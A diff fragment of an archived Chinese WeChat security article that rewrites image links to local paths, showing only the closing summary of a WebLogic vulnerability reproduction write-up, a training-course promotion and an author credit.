-![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8LkrvicZdDWu6BY69REPFR2aSnmyNzibiaGrLnHPLKcGeS6btbFXpQvZvhYabBbrgCMxIAJpzaVZohw/640?wx_fmt=png)
+![](../../.resource/remote/d309ed9baf57a77c88e0eefa18e028b0c6db2463db61e3b0c9206883e25c636d.png)
 
 总结
 ==
 
 weblogic 的漏洞其实有很多，这里只是挑了一些比较常见的漏洞进行漏洞分析和复现，其实也有批量检测漏洞的软件，这里为了加深印象还是手动复现了一遍，这里漏洞分析这一块当然也是跟着大佬们的思路跟下去，这里对前辈们表示衷心的感谢，不足之处欢迎指出。
 
-**![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)**
+**![](../../.resource/remote/40aaad22af7f44171fc001f77fa3df3da580afe10e64b4cc679d75fa1c5f4216.png)**
 
 **推荐阅读：**
 
@@ -477,13 +477,13 @@ weblogic 的漏洞其实有很多，这里只是挑了一些比较常见的漏�
 本月报名可以参加抽奖送 BADUSB 的优惠活动  
 
   
-[![](https://mmbiz.qpic.cn/mmbiz_jpg/Uq8Qfeuvouibfico2qhUHkxIvX2u13s7zzLMaFdWAhC1MTl3xzjjPth3bLibSZtzN9KGsEWibPgYw55Lkm5VuKthibQ/640?wx_fmt=jpeg)](http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247498688&idx=1&sn=d81921a3873e254b0a135d9ffaa00468&chksm=ec1caeffdb6b27e9d129e1b00e92e01d49ccca43bb18f2388c733143557bfaaf62d0efd7f22f&scene=21#wechat_redirect)
+[![](../../.resource/remote/7995b9e27a8398a9416d1e11b70d34ba0c54909cbf29d555ccbd9ea2faa8e15a.jpg)](http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247498688&idx=1&sn=d81921a3873e254b0a135d9ffaa00468&chksm=ec1caeffdb6b27e9d129e1b00e92e01d49ccca43bb18f2388c733143557bfaaf62d0efd7f22f&scene=21#wechat_redirect)
 
 **点赞，转发，在看**
 
 原创投稿作者：mathwizard
 
-![](https://mmbiz.qpic.cn/mmbiz_gif/Uq8QfeuvouibQiaEkicNSzLStibHWxDSDpKeBqxDe6QMdr7M5ld84NFX0Q5HoNEedaMZeibI6cKE55jiaLMf9APuY0pA/640?wx_fmt=gif)
+![](../../.resource/remote/3d59406a47f491f83d62987436684eaf1bfb52529e9b5762264fd89bfd614dc4.gif)
 
 ---
 
